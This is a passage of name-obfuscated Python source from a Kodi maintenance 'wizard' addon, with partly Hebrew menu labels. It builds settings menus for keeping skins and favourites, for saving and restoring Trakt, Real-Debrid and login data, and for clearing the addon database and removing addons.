	OOOOO0000000O00O0 =len (O0OO0000000O00OO0 )+len (OO0OO000OO000O000 )+len (O0OOO0OO00O0O0O0O )+len (OOOO0O0OO00O00O00 )+len (O0O00O00OOO0OOOOO )+len (O00OOO0OOOO0O00OO )+len (O000O00000OO00OO0 )#line:3446
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOOOO0000000O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3447
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0OO00O0O0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3448
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO0O0OO00O00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3449
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO000OO000O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3450
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0000000O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3451
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O00000OO00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3452
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO0OOOO0O00OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3453
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00O00OOO0OOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3454
def Menu ():#line:3455
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3456
def saveMenu ():#line:3458
	OO00OO0OOOO0OOO0O ='[COLOR yellow]מופעל[/COLOR]';OOOOO0OOO0O000O0O ='[COLOR blue]מבוטל[/COLOR]'#line:3460
	OOO0O0OOOOOOO0OOO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3461
	OOOOOOO0O0OO00O0O ='true'if KEEPMOVIELIST =='true'else 'false'#line:3462
	OOO0OO0O0000000O0 ='true'if KEEPINFO =='true'else 'false'#line:3463
	O0O0O0OOOOOOOO0O0 ='true'if KEEPSOUND =='true'else 'false'#line:3465
	O0OOOOO0OOO0OO000 ='true'if KEEPVIEW =='true'else 'false'#line:3466
	OOO0OOO0O0000OOOO ='true'if KEEPSKIN =='true'else 'false'#line:3467
	OOOO0000000000OOO ='true'if KEEPSKIN2 =='true'else 'false'#line:3468
	O0OO0O0O0O0O00O00 ='true'if KEEPSKIN3 =='true'else 'false'#line:3469
	O0O000OOOO0O000O0 ='true'if KEEPADDONS =='true'else 'false'#line:3470
	O0OO0O0O000O0OO0O ='true'if KEEPPVR =='true'else 'false'#line:3471
	O0OO00O00000O000O ='true'if KEEPTVLIST =='true'else 'false'#line:3472
	O0O0OOO00OOOO0O0O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3473
	O0000000OOOO000O0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3474
	OO0OO0OO000OO00OO ='true'if KEEPHUBTV =='true'else 'false'#line:3475
	OO0OOOO00OO0OO00O ='true'if KEEPHUBVOD =='true'else 'false'#line:3476
	OO000O0O000OO00OO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3477
	O00OO0O00O00O0O0O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3478
	O00OOO0O0000O0000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3479
	O0O000OOOOOOO0000 ='true'if KEEPHUBMENU =='true'else 'false'#line:3480
	OOO000O00000OO0OO ='true'if KEEPPLAYLIST =='true'else 'false'#line:3481
	O000O0OO00000OOOO ='true'if KEEPTRAKT =='true'else 'false'#line:3482
	O0OOOOO0O00O00000 ='true'if KEEPREAL =='true'else 'false'#line:3483
	OO0OOO00OOO0000O0 ='true'if KEEPRD2 =='true'else 'false'#line:3484
	O0OO00OO0O0OOO0OO ='true'if KEEPTORNET =='true'else 'true'#line:3485
	OO0OOO00OOO000OO0 ='true'if KEEPLOGIN =='true'else 'false'#line:3486
	OOOOO0OO000OOO0O0 ='true'if KEEPSOURCES =='true'else 'false'#line:3487
	O00O000O000OOO0OO ='true'if KEEPADVANCED =='true'else 'false'#line:3488
	O000O00OOO0OO0O00 ='true'if KEEPPROFILES =='true'else 'false'#line:3489
	O00O00O0OO0O000O0 ='true'if KEEPFAVS =='true'else 'false'#line:3490
	OO0OOO000OOO0O0O0 ='true'if KEEPREPOS =='true'else 'false'#line:3491
	O0OO00000OOO0000O ='true'if KEEPSUPER =='true'else 'false'#line:3492
	OO0OOO0OOO0OO0O00 ='true'if KEEPWHITELIST =='true'else 'false'#line:3493
	OOO000O0OOOOO00OO ='true'if KEEPWEATHER =='true'else 'false'#line:3494
	O000O0O0000O00OOO ='true'if KEEPVICTORY =='true'else 'false'#line:3495
	OO0000O000000O0OO ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3496
	if OO0OOO0OOO0OO0O00 =='true':#line:3498
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3499
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3500
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3501
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3502
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3503
	addFile ('%s שמירת חשבון RD:  '%O0OOOOO0O00O00000 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3506
	addFile ('%s שמירת חשבון טראקט:  '%O000O0OO00000OOOO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3507
	addFile ('%s שמירת מועדפים:  '%O00O00O0OO0O000O0 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3510
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OO0O0O000O0OO0O .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3511
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O000O0O0000O00OOO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3512
	addFile ('%s שמירת חשבון טלמדיה:  '%OO0000O000000O0OO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3513
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0OO00O00000O000O .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3514
	addFile ('%s שמירת אריח סרטים:  '%O0O0OOO00OOOO0O0O .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3515
	addFile ('%s שמירת אריח סדרות:  '%O0000000OOOO000O0 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3516
	addFile ('%s שמירת אריח טלויזיה:  '%OO0OO0OO000OO00OO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3517
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0OOOO00OO0OO00O .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3518
	addFile ('%s שמירת אריח ספורט:  '%OO000O0O000OO00OO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3519
	addFile ('%s שמירת אריח ילדים:  '%O00OO0O00O00O0O0O .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3520
	addFile ('%s שמירת אריח מוסיקה:  '%O00OOO0O0000O0000 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3521
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0O000OOOOOOO0000 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3522
	addFile ('%s שמירת כל האריחים בסקין:  '%OOO0OOO0O0000OOOO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3523
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOO000O0OOOOO00OO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3524
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0O000OOOO0O000O0 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3530
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OOO0OO0O0000000O0 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3531
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOOOOOO0O0OO00O0O .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3534
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OOOOO0OO000OOO0O0 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3535
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0O0O0OOOOOOOO0O0 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3536
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0OOOOO0OOO0OO000 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3538
	addFile ('%s שמירת פליליסט לאודר:  '%OOO000O00000OO0OO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3539
	addFile ('%s שמירת הגדרות באפר: '%O00O000O000OOO0OO .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3544
	addFile ('%s שמירת רשימות ריפו:  '%OO0OOO000OOO0O0O0 .replace ('true',OO00OO0OOOO0OOO0O ).replace ('false',OOOOO0OOO0O000O0O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3546
	setView ('files','viewType')#line:3548
def traktMenu ():#line:3550
	OOOO0OOO0OO0OOO0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3551
	O000O0O00O000OO0O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3552
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3553
	addFile ('Save Trakt Data: %s'%OOOO0OOO0OO0OOO0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3554
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O000O0O00O000OO0O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3555
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3556
	for OOOO0OOO0OO0OOO0O in traktit .ORDER :#line:3558
		OOOO000O000OO000O =TRAKTID [OOOO0OOO0OO0OOO0O ]['name']#line:3559
		OOOO0000O000OOOO0 =TRAKTID [OOOO0OOO0OO0OOO0O ]['path']#line:3560
		O0O00000O0OOOOO0O =TRAKTID [OOOO0OOO0OO0OOO0O ]['saved']#line:3561
		OOOOO00O00O000000 =TRAKTID [OOOO0OOO0OO0OOO0O ]['file']#line:3562
		O00OOOO00O0000O0O =wiz .getS (O0O00000O0OOOOO0O )#line:3563
		OO00O0OO00O000000 =traktit .traktUser (OOOO0OOO0OO0OOO0O )#line:3564
		OOOOO0000OO0O00O0 =TRAKTID [OOOO0OOO0OO0OOO0O ]['icon']if os .path .exists (OOOO0000O000OOOO0 )else ICONTRAKT #line:3565
		OOOOO0O000OOOOO00 =TRAKTID [OOOO0OOO0OO0OOO0O ]['fanart']if os .path .exists (OOOO0000O000OOOO0 )else FANART #line:3566
		O0OOOO00OO0OO00OO =createMenu ('saveaddon','Trakt',OOOO0OOO0OO0OOO0O )#line:3567
		O00OOOOOOO0OO0OO0 =createMenu ('save','Trakt',OOOO0OOO0OO0OOO0O )#line:3568
		O0OOOO00OO0OO00OO .append ((THEME2 %'%s Settings'%OOOO000O000OO000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOOO0OOO0OO0OOO0O )))#line:3569
		addFile ('[+]-> %s'%OOOO000O000OO000O ,'',icon =OOOOO0000OO0O00O0 ,fanart =OOOOO0O000OOOOO00 ,themeit =THEME3 )#line:3571
		if not os .path .exists (OOOO0000O000OOOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOO0000OO0O00O0 ,fanart =OOOOO0O000OOOOO00 ,menu =O0OOOO00OO0OO00OO )#line:3572
		elif not OO00O0OO00O000000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOOO0OOO0OO0OOO0O ,icon =OOOOO0000OO0O00O0 ,fanart =OOOOO0O000OOOOO00 ,menu =O0OOOO00OO0OO00OO )#line:3573
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O0OO00O000000 ,'authtrakt',OOOO0OOO0OO0OOO0O ,icon =OOOOO0000OO0O00O0 ,fanart =OOOOO0O000OOOOO00 ,menu =O0OOOO00OO0OO00OO )#line:3574
		if O00OOOO00O0000O0O =="":#line:3575
			if os .path .exists (OOOOO00O00O000000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOOO0OOO0OO0OOO0O ,icon =OOOOO0000OO0O00O0 ,fanart =OOOOO0O000OOOOO00 ,menu =O00OOOOOOO0OO0OO0 )#line:3576
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOOO0OOO0OO0OOO0O ,icon =OOOOO0000OO0O00O0 ,fanart =OOOOO0O000OOOOO00 ,menu =O00OOOOOOO0OO0OO0 )#line:3577
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00OOOO00O0000O0O ,'',icon =OOOOO0000OO0O00O0 ,fanart =OOOOO0O000OOOOO00 ,menu =O00OOOOOOO0OO0OO0 )#line:3578
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3580
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3581
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3582
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3583
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3584
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3585
	setView ('files','viewType')#line:3586
def realMenu ():#line:3588
	O00O00O00O00O00O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3589
	OO0O000OOOO000O0O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3590
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3591
	addFile ('Save Real Debrid Data: %s'%O00O00O00O00O00O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3592
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO0O000OOOO000O0O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3593
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3594
	for O0OOOOOO0000O0OOO in debridit .ORDER :#line:3596
		O000OO0OO0OOOO0OO =DEBRIDID [O0OOOOOO0000O0OOO ]['name']#line:3597
		O00OO0OO0OOOO0000 =DEBRIDID [O0OOOOOO0000O0OOO ]['path']#line:3598
		OOOO00000OO00OO00 =DEBRIDID [O0OOOOOO0000O0OOO ]['saved']#line:3599
		O0O0O0O00O0O000OO =DEBRIDID [O0OOOOOO0000O0OOO ]['file']#line:3600
		O0O00OOO000OOO00O =wiz .getS (OOOO00000OO00OO00 )#line:3601
		OOOO0O000OOO0OOO0 =debridit .debridUser (O0OOOOOO0000O0OOO )#line:3602
		OOOO00O0OOOO0OO00 =DEBRIDID [O0OOOOOO0000O0OOO ]['icon']if os .path .exists (O00OO0OO0OOOO0000 )else ICONREAL #line:3603
		OOO0O0O0O0OOOOOO0 =DEBRIDID [O0OOOOOO0000O0OOO ]['fanart']if os .path .exists (O00OO0OO0OOOO0000 )else FANART #line:3604
		OOO0O00OOOOOO00O0 =createMenu ('saveaddon','Debrid',O0OOOOOO0000O0OOO )#line:3605
		O00O0OO0OOO00O0OO =createMenu ('save','Debrid',O0OOOOOO0000O0OOO )#line:3606
		OOO0O00OOOOOO00O0 .append ((THEME2 %'%s Settings'%O000OO0OO0OOOO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OOOOOO0000O0OOO )))#line:3607
		addFile ('[+]-> %s'%O000OO0OO0OOOO0OO ,'',icon =OOOO00O0OOOO0OO00 ,fanart =OOO0O0O0O0OOOOOO0 ,themeit =THEME3 )#line:3609
		if not os .path .exists (O00OO0OO0OOOO0000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO00O0OOOO0OO00 ,fanart =OOO0O0O0O0OOOOOO0 ,menu =OOO0O00OOOOOO00O0 )#line:3610
		elif not OOOO0O000OOO0OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OOOOOO0000O0OOO ,icon =OOOO00O0OOOO0OO00 ,fanart =OOO0O0O0O0OOOOOO0 ,menu =OOO0O00OOOOOO00O0 )#line:3611
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOO0O000OOO0OOO0 ,'authdebrid',O0OOOOOO0000O0OOO ,icon =OOOO00O0OOOO0OO00 ,fanart =OOO0O0O0O0OOOOOO0 ,menu =OOO0O00OOOOOO00O0 )#line:3612
		if O0O00OOO000OOO00O =="":#line:3613
			if os .path .exists (O0O0O0O00O0O000OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OOOOOO0000O0OOO ,icon =OOOO00O0OOOO0OO00 ,fanart =OOO0O0O0O0OOOOOO0 ,menu =O00O0OO0OOO00O0OO )#line:3614
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OOOOOO0000O0OOO ,icon =OOOO00O0OOOO0OO00 ,fanart =OOO0O0O0O0OOOOOO0 ,menu =O00O0OO0OOO00O0OO )#line:3615
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OOO000OOO00O ,'',icon =OOOO00O0OOOO0OO00 ,fanart =OOO0O0O0O0OOOOOO0 ,menu =O00O0OO0OOO00O0OO )#line:3616
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3618
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3619
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3620
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3621
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3622
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3623
	setView ('files','viewType')#line:3624
def loginMenu ():#line:3626
	OO0OOO00OOOO00O00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3627
	OOOOO0OO0O0OOOOOO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3628
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3629
	addFile ('Save Login Data: %s'%OO0OOO00OOOO00O00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3630
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOOO0OO0O0OOOOOO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3631
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3632
	for OO0OOO00OOOO00O00 in loginit .ORDER :#line:3634
		OO000000000000OOO =LOGINID [OO0OOO00OOOO00O00 ]['name']#line:3635
		O0OO0OO0OO000O00O =LOGINID [OO0OOO00OOOO00O00 ]['path']#line:3636
		O0OOOO0000O00O000 =LOGINID [OO0OOO00OOOO00O00 ]['saved']#line:3637
		OOO00O0O0OOO0OOO0 =LOGINID [OO0OOO00OOOO00O00 ]['file']#line:3638
		OOOO000OO0OO0O00O =wiz .getS (O0OOOO0000O00O000 )#line:3639
		OOOOO000OOO000000 =loginit .loginUser (OO0OOO00OOOO00O00 )#line:3640
		OO0000000O00O0O00 =LOGINID [OO0OOO00OOOO00O00 ]['icon']if os .path .exists (O0OO0OO0OO000O00O )else ICONLOGIN #line:3641
		OO0O0OOO00O000OOO =LOGINID [OO0OOO00OOOO00O00 ]['fanart']if os .path .exists (O0OO0OO0OO000O00O )else FANART #line:3642
		O000O0OOOOOO00OO0 =createMenu ('saveaddon','Login',OO0OOO00OOOO00O00 )#line:3643
		O0OO00OOO000O0000 =createMenu ('save','Login',OO0OOO00OOOO00O00 )#line:3644
		O000O0OOOOOO00OO0 .append ((THEME2 %'%s Settings'%OO000000000000OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0OOO00OOOO00O00 )))#line:3645
		addFile ('[+]-> %s'%OO000000000000OOO ,'',icon =OO0000000O00O0O00 ,fanart =OO0O0OOO00O000OOO ,themeit =THEME3 )#line:3647
		if not os .path .exists (O0OO0OO0OO000O00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0000000O00O0O00 ,fanart =OO0O0OOO00O000OOO ,menu =O000O0OOOOOO00OO0 )#line:3648
		elif not OOOOO000OOO000000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0OOO00OOOO00O00 ,icon =OO0000000O00O0O00 ,fanart =OO0O0OOO00O000OOO ,menu =O000O0OOOOOO00OO0 )#line:3649
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO000OOO000000 ,'authlogin',OO0OOO00OOOO00O00 ,icon =OO0000000O00O0O00 ,fanart =OO0O0OOO00O000OOO ,menu =O000O0OOOOOO00OO0 )#line:3650
		if OOOO000OO0OO0O00O =="":#line:3651
			if os .path .exists (OOO00O0O0OOO0OOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0OOO00OOOO00O00 ,icon =OO0000000O00O0O00 ,fanart =OO0O0OOO00O000OOO ,menu =O0OO00OOO000O0000 )#line:3652
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0OOO00OOOO00O00 ,icon =OO0000000O00O0O00 ,fanart =OO0O0OOO00O000OOO ,menu =O0OO00OOO000O0000 )#line:3653
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOO000OO0OO0O00O ,'',icon =OO0000000O00O0O00 ,fanart =OO0O0OOO00O000OOO ,menu =O0OO00OOO000O0000 )#line:3654
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3656
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3657
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3658
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3659
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3660
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3661
	setView ('files','viewType')#line:3662
def fixUpdate ():#line:3664
	if KODIV <17 :#line:3665
		OOOOOOO000O000O00 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3666
		try :#line:3667
			os .remove (OOOOOOO000O000O00 )#line:3668
		except Exception as OO000OOO000000O00 :#line:3669
			wiz .log ("Unable to remove %s, Purging DB"%OOOOOOO000O000O00 )#line:3670
			wiz .purgeDb (OOOOOOO000O000O00 )#line:3671
	else :#line:3672
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3673
def removeAddonMenu ():#line:3675
	O0000O00O0OOO0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3676
	O0O0OO0O0O00O0O00 =[];O0000O0OOO0OOO0OO =[]#line:3677
	for O00OO0O000O0O0O00 in sorted (O0000O00O0OOO0O0O ,key =lambda OO00O000OOOOOO0OO :OO00O000OOOOOO0OO ):#line:3678
		OO0O00OOOOOO00000 =os .path .split (O00OO0O000O0O0O00 [:-1 ])[1 ]#line:3679
		if OO0O00OOOOOO00000 in EXCLUDES :continue #line:3680
		elif OO0O00OOOOOO00000 in DEFAULTPLUGINS :continue #line:3681
		elif OO0O00OOOOOO00000 =='packages':continue #line:3682
		OO00O0OO0O00OO0OO =os .path .join (O00OO0O000O0O0O00 ,'addon.xml')#line:3683
		if os .path .exists (OO00O0OO0O00OO0OO ):#line:3684
			O00O0OOOOOO000000 =open (OO00O0OO0O00OO0OO )#line:3685
			OOO0O000OO00OOOOO =O00O0OOOOOO000000 .read ()#line:3686
			O0OO0O0O0O0OO0OOO =wiz .parseDOM (OOO0O000OO00OOOOO ,'addon',ret ='id')#line:3687
			O0OOOOOO00OOOO0O0 =OO0O00OOOOOO00000 if len (O0OO0O0O0O0OO0OOO )==0 else O0OO0O0O0O0OO0OOO [0 ]#line:3689
			try :#line:3690
				O000OO000OO0OO0OO =xbmcaddon .Addon (id =O0OOOOOO00OOOO0O0 )#line:3691
				O0O0OO0O0O00O0O00 .append (O000OO000OO0OO0OO .getAddonInfo ('name'))#line:3692
				O0000O0OOO0OOO0OO .append (O0OOOOOO00OOOO0O0 )#line:3693
			except :#line:3694
				pass #line:3695
	if len (O0O0OO0O0O00O0O00 )==0 :#line:3696
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3697
		return #line:3698
	if KODIV >16 :#line:3699
		OO00O000OO0000OO0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O0OO0O0O00O0O00 )#line:3700
	else :#line:3701
		OO00O000OO0000OO0 =[];O000OO00000OOO0OO =0 #line:3702
		O00O0O0000O00OO0O =["-- Click here to Continue --"]+O0O0OO0O0O00O0O00 #line:3703
